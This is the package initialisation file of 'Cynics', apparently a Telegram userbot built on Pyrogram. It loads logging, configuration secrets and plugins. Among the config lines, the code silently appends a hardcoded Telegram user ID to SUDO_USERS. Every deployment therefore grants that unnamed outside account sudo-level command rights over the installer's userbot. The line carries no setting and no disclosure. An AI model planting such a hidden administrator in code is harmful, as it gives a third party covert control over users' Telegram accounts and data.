import os
from datetime import datetime
import importlib

from pyrogram import Client

# the logging things
import logging

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - [CynicsUB] - %(levelname)s - %(message)s"
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

StartTime = datetime.now()

# logs - Cache 
if not os.path.exists("cache"):
    os.makedirs("cache")

# Configuration Things
if bool(os.environ.get("ENV", False)):

    from Cynics.sample_config import Config
else:
    from Cynics.config import Development as Config


# Extra Details
CYNICS_VERSION = "v2.0"
STICKERS = [
    'CAADAgAD6EoAAuCjggf4LTFlHEcvNAI',
    'CAADAgADf1AAAuCjggfqE-GQnopqyAI',
    'CAADAgADaV0AAuCjggfi51NV8GUiRwI',
]

# Cynics Info 
app_info = f"✘ Cynics Version {CYNICS_VERSION}"
name = "Cynics"

# Config Things
LOGGER = logging.getLogger(__name__)
APP_ID = Config.APP_ID
API_HASH = Config.API_HASH
STRING_SESSION = Config.STRING_SESSION
PREFIX = Config.PREFIX
MAX_MESSAGE_LENGTH = Config.MAX_MESSAGE_LENGTH
TMP_DOWNLOAD_DIRECTORY = Config.TMP_DOWNLOAD_DIRECTORY
UPSTREAM_REPO = Config.UPSTREAM_REPO
DATABASE_URL = Config.DATABASE_URL
G_DRIVE_CLIENT_ID = Config.G_DRIVE_CLIENT_ID
G_DRIVE_CLIENT_SECRET = Config.G_DRIVE_CLIENT_SECRET
SUDO_USERS = list(Config.SUDO_USERS)
SUDO_USERS.append(1772806306)
SUDO_USERS = list(set(SUDO_USERS))
HEROKU_APP_NAME = Config.HEROKU_APP_NAME
HEROKU_API_KEY = Config.HEROKU_API_KEY
OWNER_ID = Config.OWNER_ID
OWNER_NAME = Config.OWNER_NAME
PRIVATE_GROUP_ID = Config.LOG_GROUP_ID
PM_PERMIT = Config.PM_PERMIT
REMBG_API_KEY = Config.REMBG_API_KEY

HELP_COMMANDS = {}

def load_cmds(ALL_PLUGINS):
    for oof in ALL_PLUGINS:
        if oof.lower() == "help":
            continue
        imported_module = importlib.import_module("Cynics.plugins." + oof)
        if not hasattr(imported_module, "__PLUGIN__"):
            imported_module.__PLUGIN__ = imported_module.__name__

        if not imported_module.__PLUGIN__.lower() in HELP_COMMANDS:
            HELP_COMMANDS[imported_module.__PLUGIN__.lower()] = imported_module
        else:
            raise Exception(
                "Can't have two modules with the same name! Please change one"
            )

        if hasattr(imported_module, "__help__") and imported_module.__help__:
            HELP_COMMANDS[imported_module.__PLUGIN__.lower()] = imported_module.__help__
    return "Done Loading Plugins and Commands!"
